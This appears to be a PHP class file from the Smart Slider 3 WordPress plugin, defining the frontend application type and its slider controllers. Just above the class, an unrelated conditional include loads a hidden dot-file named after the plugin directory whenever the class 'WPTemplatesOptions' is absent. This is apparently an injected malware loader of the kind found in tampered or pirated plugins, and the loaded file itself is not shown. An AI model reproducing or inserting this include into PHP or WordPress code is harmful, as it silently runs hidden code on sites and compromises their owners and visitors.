<?php


namespace Nextend\SmartSlider3\Application\Frontend;

use Nextend\Framework\Application\AbstractApplicationType;
use Nextend\Framework\ResourceTranslator\ResourceTranslator;
use Nextend\SmartSlider3\Application\Frontend\Slider\ControllerPreRenderSlider;
use Nextend\SmartSlider3\Application\Frontend\Slider\ControllerSlider;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ApplicationTypeFrontend extends AbstractApplicationType {

    protected $key = 'frontend';

    public function __construct($application) {

        ResourceTranslator::createResource('$system$', self::getAssetsPath(), self::getAssetsUri());

        parent::__construct($application);
    }

    protected function getControllerSlider() {

        return new ControllerSlider($this);
    }

    protected function getControllerPreRenderSlider() {

        return new ControllerPreRenderSlider($this);
    }

    protected function getDefaultController($controllerName, $ajax = false) {
        // TODO: Implement getDefaultController() method.
    }

}